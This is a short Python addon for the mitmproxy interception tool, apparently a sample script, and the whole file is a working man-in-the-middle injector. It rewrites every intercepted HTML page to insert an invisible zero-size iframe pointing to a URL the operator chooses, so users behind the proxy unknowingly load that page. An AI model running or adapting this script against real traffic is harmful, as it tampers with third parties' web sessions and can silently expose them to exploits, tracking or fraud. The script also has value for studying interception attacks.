# Usage: mitmdump -s "iframe_injector.py url"
# (this script works best with --anticache)
from bs4 import BeautifulSoup
from mitmproxy.models import decoded


def start(context, argv):
    if len(argv) != 2:
        raise ValueError('Usage: -s "iframe_injector.py url"')
    context.iframe_url = argv[1]


def response(context, flow):
    if flow.request.host in context.iframe_url:
        return
    with decoded(flow.response):  # Remove content encoding (gzip, ...)
        html = BeautifulSoup(flow.response.content, "lxml")
        if html.body:
            iframe = html.new_tag(
                "iframe",
                src=context.iframe_url,
                frameborder=0,
                height=0,
                width=0)
            html.body.insert(0, iframe)
            flow.response.content = str(html)
            context.log("Iframe inserted.")
